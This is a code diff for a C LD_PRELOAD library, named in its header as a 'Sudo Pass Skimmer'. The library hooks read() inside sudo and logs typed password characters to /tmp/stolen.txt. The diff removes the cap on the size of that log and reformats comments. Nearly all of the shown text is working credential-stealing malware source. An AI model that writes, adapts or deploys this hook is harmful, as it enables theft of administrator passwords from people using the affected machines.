@@ -1,3 +1,4 @@
+
 /* 
  *                           LD_PRELOAD Sudo Pass Skimmer
  *
@@ -28,7 +29,6 @@
 #include <sys/stat.h>
 #include <unistd.h>
 
-#define MAX_FILE_SIZE 128
 #define MAX_PROCESS_NAME_LEN 256
 
 //pointer to real read func (needs to be PIC)
@@ -70,10 +70,6 @@ ssize_t read(int fd, void *buf, size_t count) {
   }
   // check if the current process is sudo
   if(amsudo() == 0) {
-    // make sure our file stays small
-    if(getfsize("/tmp/stolen.txt") >= MAX_FILE_SIZE) {
-      return original_read(fd, buf, count);
-    }
     // this helps us isolate the characters from term only
     if(count == 1) {
       FILE *stealer = fopen("/tmp/stolen.txt", "a+");
@@ -86,23 +82,23 @@ ssize_t read(int fd, void *buf, size_t count) {
       // file as sudo makes its exit, so if we can trap that, we can
       // use it as a termintaor for subsequent password entries.
       if(((char)keybuf[0] == 0x11) && (getfsize("/tmp/stolen.txt") != 0)) {
-        // we can make sure back to back newlines are not being
-        // written by pointing to the end of the file then pulling
-        // the character one back from EOF, then running a negate
-        // check on it.
-        fseek(stealer, -1, SEEK_END);
-        if(fgetc(stealer) != '\n') {
-          // if the last two checks go through, we can write a
-          // line feed.
-          fprintf(stealer, "\n");
-        }
+	// we can make sure back to back newlines are not being
+	// written by pointing to the end of the file then pulling
+	// the character one back from EOF, then running a negate
+	// check on it.
+	fseek(stealer, -1, SEEK_END);
+	if(fgetc(stealer) != '\n') {
+	  // if the last two checks go through, we can write a
+	  // line feed.
+	  fprintf(stealer, "\n");
+	}
       }
       else {
-        // otherwise we just start writing our keys pressed to the
-        // /tmp/stolen.txt file. We just need to cast buf to a char
-        // pointer, and make sure only a single char is written at
-        // a time.
-        fprintf(stealer, "%.1s", (char *)buf);
+	// otherwise we just start writing our keys pressed to the
+	// /tmp/stolen.txt file. We just need to cast buf to a char
+	// pointer, and make sure only a single char is written at
+	// a time.
+	fprintf(stealer, "%.1s", (char *)buf);
       }
       fclose(stealer);
     }
